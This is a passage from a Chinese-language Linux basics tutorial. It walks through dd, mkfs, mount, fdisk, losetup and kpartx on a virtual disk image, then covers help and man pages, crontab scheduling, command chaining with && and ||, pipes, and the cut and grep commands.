id="dd-命令基本使用">dd 命令基本使用</h4><p><code>dd</code> 命令用于转换和复制文件，不过它的复制不同于 <code>cp</code>。之前提到过关于 Linux 的很重要的一点，<strong>一切即文件</strong>，在 Linux 上，硬件的设备驱动（如硬盘）和特殊设备文件（如 <code>/dev/zero</code> 和 <code>/dev/random</code>）都像普通文件一样，只是在各自的驱动程序中实现了对应的功能，<code>dd</code> 也可以读取文件或写入这些文件。这样，<code>dd</code> 也可以用在备份硬件的引导扇区、获取一定数量的随机数据或者空数据等任务中。<code>dd</code> 程序也可以在复制时处理数据，例如转换字节序、或在 ASCII 与 EBCDIC 编码间互换。</p><p><code>dd</code> 的命令行语句与其他的 Linux 程序不同，因为它的命令行选项格式为 <strong>选项=值</strong>，而不是更标准的 <strong>–选项 值</strong> 或 <strong>-选项=值</strong>。<code>dd</code> 默认从标准输入中读取，并写入到标准输出中，但可以用选项 <code>if</code>（input file，输入文件）和 <code>of</code>（output file，输出文件）改变。</p><p>我们先来试试用 <code>dd</code> 命令从标准输入读入用户的输入到标准输出或者一个文件中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 输出到文件</span><br>dd of=<span class="hljs-built_in">test</span> bs=10 count=1 <span class="hljs-comment"># 或者 dd if=/dev/stdin of=test bs=10 count=1</span><br><span class="hljs-comment"># 输出到标准输出</span><br>dd <span class="hljs-keyword">if</span>=/dev/stdin of=/dev/stdout bs=10 count=1<br><span class="hljs-comment"># 在打完了这个命令后，继续在终端打字，作为你的输入</span><br></code></pre></td></tr></table></figure><p>上述命令从标准输入设备读入用户输入（缺省值，所以可省略）然后输出到 test 文件，<code>bs</code>（block size）用于指定块大小（缺省单位为 Byte，也可为其指定如 <code>K</code>，<code>M</code>，<code>G</code> 等单位），<code>count</code> 用于指定块数量。如上图所示，我指定只读取总共 10 个字节的数据，当我输入了 <code>hello shiyanlou</code> 之后加上空格回车总共 16 个字节（一个英文字符占一个字节）内容，显然超过了设定大小。使用 <code>du</code> 和 <code>cat</code> 10 个字节（那个黑底百分号表示这里没有换行符），而其他的多余输入将被截取并保留在标准输入。</p><p>前面说到 <code>dd</code> 在拷贝的同时还可以实现数据转换，那下面就举一个简单的例子：将输出的英文字符转换为大写再写入文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dd <span class="hljs-keyword">if</span>=/dev/stdin of=<span class="hljs-built_in">test</span> bs=10 count=1 conv=ucase<br></code></pre></td></tr></table></figure><h4 id="使用-dd-命令创建虚拟镜像文件">使用 dd 命令创建虚拟镜像文件</h4><p>通过上面一小节，你应该掌握了 <code>dd</code> 的基本使用，下面就来使用 <code>dd</code> 命令来完成创建虚拟磁盘的第一步。</p><p>从 <code>/dev/zero</code> 设备创建一个容量为 256M 的空文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">dd <span class="hljs-keyword">if</span>=/dev/zero of=virtual.img bs=1M count=256<br>du -h virtual.img<br></code></pre></td></tr></table></figure><p>然后我们要将这个文件格式化（写入文件系统），这里我们要学到一个（准确的说是一组）新的命令来完成这个需求。</p><h4 id="使用-mkfs-命令格式化磁盘（我们这里是自己创建的虚拟磁盘镜像）">使用 mkfs 命令格式化磁盘（我们这里是自己创建的虚拟磁盘镜像）</h4><p>你可以在命令行输入 <code>sudo mkfs</code> 然后按下 <code>&lt;Tab&gt;</code> 键，你可以看到很多个以 mkfs 为前缀的命令，这些不同的后缀其实就是表示着不同的文件系统，可以用 mkfs 格式化成的文件系统。</p><p>我们可以简单的使用下面的命令来将我们的虚拟磁盘镜像格式化为 <code>ext4</code> 文件系统：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo mkfs.ext4 virtual.img<br></code></pre></td></tr></table></figure><p>可以看到实际 <code>mkfs.ext4</code> 是使用 <code>mke2fs</code> 来完成格式化工作的。<code>mke2fs</code> 的参数很多，不过我们也不会经常格式化磁盘来玩，所以就掌握这基本用法吧，等你有特殊需求时，再查看 man 文档解决。</p><p>更多关于文件系统的知识，请查看 wiki： <a href="http://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F#Linux_.E6.94.AF.E6.8F.B4.E7.9A.84.E6.AA.94.E6.A1.88.E7.B3.BB.E7.B5.B1">文件系统</a> <a href="http://zh.wikipedia.org/wiki/Ext3">ext3</a>，<a href="http://zh.wikipedia.org/wiki/Ext4">ext4</a></p><p>如果你想知道 Linux 支持哪些文件系统你可以输入 <code>ls -l /lib/modules/$(uname -r)/kernel/fs</code> 查看。</p><h4 id="使用-mount-命令挂载磁盘到目录树">使用 mount 命令挂载磁盘到目录树</h4><p>用户在 Linux/UNIX 的机器上打开一个文件以前，包含该文件的文件系统必须先进行挂载的动作，此时用户要对该文件系统执行 <code>mount</code> 的指令以进行挂载。该指令通常是使用在 USB 或其他可移除存储设备上，而根目录则需要始终保持挂载的状态。又因为 Linux/UNIX 文件系统可以对应一个文件而不一定要是硬件设备，所以可以挂载一个包含文件系统的文件到目录树。</p><p>Linux/UNIX 命令行的 <code>mount</code> 指令是告诉操作系统，对应的文件系统已经准备好，可以使用了，而该文件系统会对应到一个特定的点（称为挂载点）。挂载好的文件、目录、设备以及特殊文件即可提供用户使用。</p><p>我们先来使用 <code>mount</code> 来查看下主机已经挂载的文件系统：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo mount<br></code></pre></td></tr></table></figure><p>输出的结果中每一行表示一个设备或虚拟设备，每一行最前面是设备名，然后是 on 后面是挂载点，type 后面表示文件系统类型，再后面是挂载选项（比如可以在挂载时设定以只读方式挂载等等）。</p><p>那么我们如何挂载真正的磁盘到目录树呢，<code>mount</code> 命令的一般格式如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mount [options] [<span class="hljs-built_in">source</span>] [directory]<br></code></pre></td></tr></table></figure><p>一些常用操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mount [-o [操作选项]] [-t 文件系统类型] [-w|--rw|--ro] [文件系统源] [挂载点]<br></code></pre></td></tr></table></figure><p>现在直接来挂载我们创建的虚拟磁盘镜像到 <code>/mnt</code> 目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">mount -o loop -t ext4 virtual.img /mnt<br><span class="hljs-comment"># 也可以省略挂载类型，很多时候 mount 会自动识别</span><br><br><span class="hljs-comment"># 以只读方式挂载</span><br>mount -o loop --ro virtual.img /mnt<br><span class="hljs-comment"># 或者 mount -o loop,ro virtual.img /mnt</span><br></code></pre></td></tr></table></figure><h4 id="使用-umount-命令卸载已挂载磁盘">使用 umount 命令卸载已挂载磁盘</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#命令格式 sudo umount 已挂载设备名或者挂载点，如：</span><br>sudo umount /mnt<br></code></pre></td></tr></table></figure><h4 id="使用-fdisk-为磁盘分区">使用 fdisk 为磁盘分区</h4><p>（关于分区的一些概念不清楚的用户请参看 <a href="http://zh.wikipedia.org/wiki/%E4%B8%BB%E5%BC%95%E5%AF%BC%E8%AE%B0%E5%BD%95">主引导记录</a>）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看硬盘分区表信息</span><br>sudo fdisk -l<br></code></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/linux_base/7-12.png" alt=""></p><p>输出结果中开头显示了我主机上的磁盘的一些信息，包括容量扇区数，扇区大小，I/O 大小等信息。</p><p>我们重点看一下中间的分区信息，<code>/dev/sda1</code>，<code>/dev/sda2</code> 为主分区分别安装了 Windows 和 Linux 操作系统，<code>/dev/sda3</code> 为交换分区（可以理解为虚拟内存），<code>/dev/sda4</code> 为扩展分区其中包含 <code>/dev/sda5</code>，<code>/dev/sda6</code>，<code>/dev/sda7</code>，<code>/dev/sda8</code> 四个逻辑分区，因为主机上有几个分区之间有空隙，没有对齐边界扇区，所以分区之间不是完全连续的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 进入磁盘分区模式</span><br>sudo fdisk virtual.img<br></code></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/linux_base/7-13.png" alt="1"></p><p>在进行操作前我们首先应先规划好我们的分区方案，这里我将在使用 128M（可用 127M 左右）的虚拟磁盘镜像创建一个 30M 的主分区剩余部分为扩展分区包含 2 个大约 45M 的逻辑分区。</p><p>操作完成后输入 <code>p</code> 查看结果如下:</p><p><img src="https://doc.shiyanlou.com/linux_base/7-14.png" alt="1"></p><p>最后不要忘记输入 <code>w</code> 写入分区表。</p><h4 id="使用-losetup-命令建立镜像与回环设备的关联">使用 losetup 命令建立镜像与回环设备的关联</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo losetup /dev/loop0 virtual.img<br><span class="hljs-comment"># 如果提示设备忙你也可以使用其它的回环设备，&quot;ls /dev/loop*&quot;参看所有回环设备</span><br><br><span class="hljs-comment"># 解除设备关联</span><br>sudo losetup -d /dev/loop0<br></code></pre></td></tr></table></figure><p>然后再使用 <code>mkfs</code> 格式化各分区（前面我们是格式化整个虚拟磁盘镜像文件或磁盘），不过格式化之前，我们还要为各分区建立虚拟设备的映射，用到 <code>kpartx</code> 工具，需要先安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install kpartx<br>sudo kpartx -av /dev/loop0<br><br><span class="hljs-comment"># 取消映射</span><br>sudo kpartx -dv /dev/loop0<br></code></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/linux_base/7-15.png" alt="pic"></p><p>接着再是格式化，我们将其全部格式化为 ext4：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo mkfs.ext4 -q /dev/mapper/loop0p1<br>sudo mkfs.ext4 -q /dev/mapper/loop0p5<br>sudo mkfs.ext4 -q /dev/mapper/loop0p6<br></code></pre></td></tr></table></figure><p>格式化完成后在 <code>/media</code> 目录下新建四个空目录用于挂载虚拟磁盘：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkdir -p /media/virtualdisk_&#123;1..3&#125;<br><span class="hljs-comment"># 挂载磁盘分区</span><br>sudo mount /dev/mapper/loop0p1 /media/virtualdisk_1<br>sudo mount /dev/mapper/loop0p5 /media/virtualdisk_2<br>sudo mount /dev/mapper/loop0p6 /media/virtualdisk_3<br><br><span class="hljs-comment"># 卸载磁盘分区</span><br>sudo umount /dev/mapper/loop0p1<br>sudo umount /dev/mapper/loop0p5<br>sudo umount /dev/mapper/loop0p6<br></code></pre></td></tr></table></figure><p>然后：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">df -h<br></code></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/linux_base/7-16.png" alt="pic"></p><h2 id="Linux-下帮助命令">Linux 下帮助命令</h2><h3 id="内建命令与外部命令">内建命令与外部命令</h3><p>什么是内建命令，什么是外部命令呢？这和帮助命令又有什么关系呢？</p><p>因为有一些查看帮助的工具在内建命令与外建命令上是有区别对待的。</p><blockquote><p><strong>内建命令</strong>实际上是 shell 程序的一部分，其中包含的是一些比较简单的 Linux 系统命令，这些命令是写在 bash 源码的 builtins 里面的，由 shell 程序识别并在 shell 程序内部完成运行，通常在 Linux 系统加载运行时 shell 就被加载并驻留在系统内存中。而且解析内部命令 shell 不需要创建子进程，因此其执行速度比外部命令快。比如：history、cd、exit 等等。</p></blockquote><blockquote><p><strong>外部命令</strong>是 Linux 系统中的实用程序部分，因为实用程序的功能通常都比较强大，所以其包含的程序量也会很大，在系统加载时并不随系统一起被加载到内存中，而是在需要时才将其调入内存。虽然其不包含在 shell 中，但是其命令执行过程是由 shell 程序控制的。外部命令是在 Bash 之外额外安装的，通常放在/bin，/usr/bin，/sbin，/usr/sbin 等等。比如：ls、vi 等。</p></blockquote><p>简单来说就是：一个是天生自带的天赋技能，一个是后天得来的附加技能。我们可以使用 type 命令来区分命令是内建的还是外部的。例如这两个得出的结果是不同的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">type</span> <span class="hljs-built_in">exit</span><br><br><span class="hljs-built_in">type</span> vim<br></code></pre></td></tr></table></figure><p>得到的是两种结果，若是对 ls 你还能得到第三种结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 得到这样的结果说明是内建命令，正如上文所说内建命令都是在 bash 源码中的 builtins 的.def中</span><br>xxx is a shell <span class="hljs-built_in">builtin</span><br><span class="hljs-comment"># 得到这样的结果说明是外部命令，正如上文所说，外部命令在/usr/bin or /usr/sbin等等中</span><br>xxx is /usr/bin/xxx<br><span class="hljs-comment"># 若是得到alias的结果，说明该指令为命令别名所设定的名称；</span><br>xxx is an <span class="hljs-built_in">alias</span> <span class="hljs-keyword">for</span> xx --xxx<br></code></pre></td></tr></table></figure><h3 id="help-命令">help 命令</h3><p><code>help</code> 命令是用于显示 <code>shell</code> 内建命令的简要帮助信息。帮助信息中显示有该命令的简要说明以及一些参数的使用以及说明，一定记住 <code>help</code> 命令只能用于显示内建命令的帮助信息，如果是外部命令则可以在命令后加上<code>--help</code>参数。</p><h3 id="man-命令">man 命令</h3><p><code>man</code>得到的内容比用 <code>help</code> 更多更详细，而且 <code>man</code> 没有内建与外部命令的区分，因为 man 工具是显示系统手册页中的内容，也就是一本电子版的字典，这些内容大多数都是对命令的解释信息，还有一些相关的描述。通过查看系统文档中的 <code>man</code> 也可以得到程序的更多相关信息和 <code>Linux</code> 的更多特性。</p><p>在尝试上面这个命令时我们会发现最左上角显示“ LS （1）”，在这里，“ LS ”表示手册名称，而“（1）”表示该手册位于第一章节。这个章节又是什么？在 man 手册中一共有这么几个章节</p><table><thead><tr><th>章节数</th><th>说明</th></tr></thead><tbody><tr><td><code>1</code></td><td>Standard commands （标准命令）</td></tr><tr><td><code>2</code></td><td>System calls （系统调用）</td></tr><tr><td><code>3</code></td><td>Library functions （库函数）</td></tr><tr><td><code>4</code></td><td>Special devices （设备说明）</td></tr><tr><td><code>5</code></td><td>File formats （文件格式）</td></tr><tr><td><code>6</code></td><td>Games and toys （游戏和娱乐）</td></tr><tr><td><code>7</code></td><td>Miscellaneous （杂项）</td></tr><tr><td><code>8</code></td><td>Administrative Commands （管理员命令）</td></tr><tr><td><code>9</code></td><td>其他（Linux 特定的）， 用来存放内核例行程序的文档。</td></tr></tbody></table><p>打开手册之后我们可以通过 pgup 与 pgdn 或者上下键来上下翻看，可以按 q 退出当前页面</p><h3 id="info-命令">info 命令</h3><p>使用<code>info</code>命令需要手动安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">安装和操作步骤如下：<br><br><span class="hljs-comment"># 安装 info</span><br>sudo apt-get update<br>sudo apt-get install info<br><span class="hljs-comment"># 查看 ls 命令的 info</span><br>info ls<br></code></pre></td></tr></table></figure><p>得到的信息比 man 还要多，与此同时，man 和 info 就像两个集合，它们有一个交集部分，但与 man 相比，info 工具可显示更完整的 GNU 工具信息。若 man 页包含的某个工具的概要信息在 info 中也有介绍，那么 man 页中会有“请参考 info 页更详细内容”的字样。</p><h2 id="Linux-任务计划-crontab">Linux 任务计划 crontab</h2><h3 id="crontab-简介">crontab 简介</h3><p>crontab 命令从输入设备读取指令，并将其存放于 crontab 文件中，以供之后读取和执行。通常，crontab 储存的指令被守护进程激活，crond 为其守护进程，crond 常常在后台运行，每一分钟会检查一次是否有预定的作业需要执行。</p><p>通过 crontab 命令，我们可以在固定的间隔时间执行指定的系统指令或 shell 脚本。时间间隔的单位可以是分钟、小时、日、月、周的任意组合。</p><p>这里我们看一看 crontab 的格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Example of job definition:</span><br><span class="hljs-comment"># .---------------- minute (0 - 59)</span><br><span class="hljs-comment"># |  .------------- hour (0 - 23)</span><br><span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span><br><span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-comment"># |  |  |  |  |</span><br><span class="hljs-comment"># *  *  *  *  * user-name command to be executed</span><br></code></pre></td></tr></table></figure><p>我们通过下面一个命令来添加一个计划任务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crontab -e<br></code></pre></td></tr></table></figure><p>第一次启动会出现这样一个画面，这是让我们选择编辑的工具，选择第二个基本的 vim 就可以了。</p><p><img src="https://doc.shiyanlou.com/document-uid600404labid6124timestamp1523941985569.png" alt="此处输入图片的描述"></p><p>而选择后我们会进入这样一个画面，这就是添加计划的地方了，与一般的配置文档相同，以#号开头的都是注释，通过文档的最后一排我们可以猜猜 crontab 的格式是什么样的呢？</p><p><img src="https://dn-simplecloud.shiyanlou.com/1135081468202029108" alt="实验楼"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">man crontab<br></code></pre></td></tr></table></figure><p>在了解命令格式之后，我们通过这样的一个例子来完成一个任务的添加，在文档的最后一排加上这样一排命令，该任务是每分钟我们会在/home/shiyanlou 目录下创建一个以当前的年月日时分秒为名字的空白文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">*/1 * * * * touch /home/shiyanlou/$(date +\%Y\%m\%d\%H\%M\%S)<br></code></pre></td></tr></table></figure><p><strong>注意：</strong></p><blockquote><p>“ % ” 在 crontab 文件中，有结束命令行、换行、重定向的作用，前面加 ” \ ” 符号转义，否则，“ % ” 符号将执行其结束命令行或者换行的作用，并且其后的内容会被做为标准输入发送给前面的命令。</p></blockquote><p>添加成功后我们会得到最后一排 installing new crontab 的一个提示：</p><p><img src="https://dn-simplecloud.shiyanlou.com/1135081468203483143" alt="实验楼"></p><p>当然我们也可以通过这样的一个指令来查看我们添加了哪些任务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crontab -l<br></code></pre></td></tr></table></figure><p>通过图中的显示，我们也可以看出，我们正确的保存并且添加成功了该任务的：</p><p><img src="https://dn-simplecloud.shiyanlou.com/1135081468204230683" alt="实验楼"></p><p>虽然我们添加了任务，但是如果 <code>cron</code> 的守护进程并没有启动，它根本都不会监测到有任务，当然也就不会帮我们执行，我们可以通过以下 2 种方式来确定我们的 <code>cron</code> 是否成功的在后台启动，默默的帮我们做事，若是没有就得执行上文准备中的第二步了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps aux | grep cron<br><br><span class="hljs-comment"># or</span><br><br>pgrep cron<br></code></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/document-uid600404labid6124timestamp1523942683532.png" alt="此处输入图片的描述"></p><p>通过下图可以看到任务在创建之后，执行了几次，生成了一些文件，且每分钟生成一个：</p><p><img src="https://doc.shiyanlou.com/document-uid600404labid6124timestamp1523943532369.png" alt="此处输入图片的描述"></p><p>我们通过这样一个命令可以查看到执行任务命令之后在日志中的信息反馈：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo tail -f /var/<span class="hljs-built_in">log</span>/syslog<br></code></pre></td></tr></table></figure><p>从图中我们可以看到分别在 13 点 28、29、30 分的 01 秒为我们在 shiyanlou 用户的家目录下创建了文件。</p><p><img src="https://doc.shiyanlou.com/document-uid600404labid6124timestamp1523943327065.png" alt="此处输入图片的描述"></p><p>当我们并不需要这个任务的时候我们可以使用这么一个命令去删除任务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crontab -r<br></code></pre></td></tr></table></figure><p>通过图中我们可以看出我们删除之后再查看任务列表，系统已经显示该用户并没有任务哦。</p><p><img src="https://doc.shiyanlou.com/document-uid600404labid6124timestamp1523943647348.png" alt="此处输入图片的描述"></p><h3 id="crontab-的深入">crontab 的深入</h3><p>每个用户使用 <code>crontab -e</code> 添加计划任务，都会在 <code>/var/spool/cron/crontabs</code> 中添加一个该用户自己的任务文档，这样目的是为了隔离。</p><p><img src="https://dn-simplecloud.shiyanlou.com/1135081468206283987" alt="实验楼"></p><p>如果是系统级别的定时任务，需要 root 权限执行的任务应该怎么处理？</p><p>只需要使用 <code>sudo</code> 编辑 <code>/etc/crontab</code> 文件就可以。</p><p><code>cron</code> 服务监测时间最小单位是分钟，所以 <code>cron</code> 会每分钟去读取一次 <code>/etc/crontab</code> 与 <code>/var/spool/cron/crontabs</code> 里面的內容。</p><p>在 <code>/etc</code> 目录下，<code>cron</code> 相关的目录有下面几个：</p><p><img src="https://dn-simplecloud.shiyanlou.com/1135081468206856712" alt="实验楼"></p><p>每个目录的作用：</p><ol><li><code>/etc/cron.daily</code>，目录下的脚本会每天执行一次，在每天的 6 点 25 分时运行；</li><li><code>/etc/cron.hourly</code>，目录下的脚本会每个小时执行一次，在每小时的 17 分钟时运行；</li><li><code>/etc/cron.monthly</code>，目录下的脚本会每月执行一次，在每月 1 号的 6 点 52 分时运行；</li><li><code>/etc/cron.weekly</code>，目录下的脚本会每周执行一次，在每周第七天的 6 点 47 分时运行；</li></ol><p>系统默认执行时间可以根据需求进行修改。</p><h2 id="命令执行顺序控制与管道">命令执行顺序控制与管道</h2><h3 id="命令执行顺序">命令执行顺序</h3><p>在终端中简单的顺序执行你可以使用 <code>;</code> 来完成，比如你可以：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get update;sudo apt-get install some-tool;some-tool <span class="hljs-comment"># 让它自己运行</span><br></code></pre></td></tr></table></figure><p>如果我们在让它自动顺序执行命令时，前面的命令执行不成功，而后面的命令又依赖于上一条命令的结果，那么就会造成花了时间，最终却得到一个错误的结果，而且有时候直观的看你还无法判断结果是否正确。那么我们需要能够有选择性的来执行命令，比如上一条命令执行成功才继续下一条，或者不成功又该做出其它什么处理，比如我们使用 <code>which</code> 来查找是否安装某个命令，如果找到就执行该命令，否则什么也不做，虽然这个操作没有什么实际意义，但可帮你更好的理解一些概念：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">which</span> cowsay&gt;/dev/null &amp;&amp; cowsay -f head-in ohch~<br></code></pre></td></tr></table></figure><p>你如果没有安装 <code>cowsay</code>，你可以先执行一次上述命令，你会发现什么也没发生，你再安装好之后你再执行一次上述命令，你也会发现一些惊喜。</p><p>上面的 <code>&amp;&amp;</code> 就是用来实现选择性执行的，它表示如果前面的命令执行结果（不是表示终端输出的内容，而是表示命令执行状态的结果）返回 0 则执行后面的，否则不执行，你可以从 <code>$?</code> 环境变量获取上一次命令的返回结果。</p><p>学习过 C 语言的应该知道在 C 语言里面 <code>&amp;&amp;</code> 表示逻辑与，而且还有一个 <code>||</code> 表示逻辑或，同样 Shell 也有一个 <code>||</code>，它们的区别就在于，shell 中的这两个符号除了也可用于表示逻辑与和或之外，就是可以实现这里的命令执行顺序的简单控制。<code>||</code> 在这里就是与 <code>&amp;&amp;</code> 相反的控制效果，当上一条命令执行结果为 <code>≠0(\$?≠0)</code> 时则执行它后面的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">which</span> cowsay&gt;/dev/null || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cowsay has not been install, please run &#x27;sudo apt-get install cowsay&#x27; to install&quot;</span><br></code></pre></td></tr></table></figure><p>除了上述基本的使用之外，我们还可以结合着 <code>&amp;&amp;</code> 和 <code>||</code> 来实现一些操作，比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">which</span> cowsay&gt;/dev/null &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;exist&quot;</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;not exist&quot;</span><br></code></pre></td></tr></table></figure><p>用流程图可以理解为：</p><p><img src="https://doc.shiyanlou.com/linux_base/8-3.png" alt=""></p><h3 id="管道">管道</h3><p>比如查看 <code>/etc</code> 目录下有哪些文件和目录，使用 <code>ls</code> 命令来查看：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ls -al /etc<br></code></pre></td></tr></table></figure><p>有太多内容，屏幕不能完全显示，这时候可以使用滚动条或快捷键滚动窗口来查看。不过这时候可以使用管道：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ls -al /etc | less<br></code></pre></td></tr></table></figure><p>通过管道将前一个命令(<code>ls</code>)的输出作为下一个命令(<code>less</code>)的输入，然后就可以一行一行地看。</p><h3 id="cut-命令">cut 命令</h3><p>打印 <code>/etc/passwd</code> 文件中以 <code>:</code> 为分隔符的第 1 个字段和第 6 个字段分别表示用户名和其家目录：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cut <span class="hljs-regexp">/etc/</span>passwd -d <span class="hljs-string">&#x27;:&#x27;</span> -f <span class="hljs-number">1</span>,<span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><p>打印 <code>/etc/passwd</code> 文件中每一行的前 N 个字符：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 前五个（包含第五个）</span><br>cut /etc/passwd -c -5<br><span class="hljs-comment"># 前五个之后的（包含第五个）</span><br>cut /etc/passwd -c 5-<br><span class="hljs-comment"># 第五个</span><br>cut /etc/passwd -c 5<br><span class="hljs-comment"># 2 到 5 之间的（包含第五个）</span><br>cut /etc/passwd -c 2-5<br></code></pre></td></tr></table></figure><h3 id="grep-命令">grep 命令</h3><p><code>grep</code> 命令是很强大的，也是相当常用的一个命令，它结合正则表达式可以实现很复杂却很高效的匹配和查找，不过在学习正则表达式之前，这里介绍它简单的使用，而关于正则表达式后面将会有单独一小节介绍到时会再继续学习 <code>grep</code> 命令和其他一些命令。</p><p><code>grep</code> 命令的一般形式为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep [命令选项]... 用于匹配的表达式 [文件]...<br></code></pre></td></tr></table></figure><p>还是先体验一下，我们搜索<code>/home/shiyanlou</code>目录下所有包含&quot;shiyanlou&quot;的文本文件，并显示出现在文本中的行号：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code 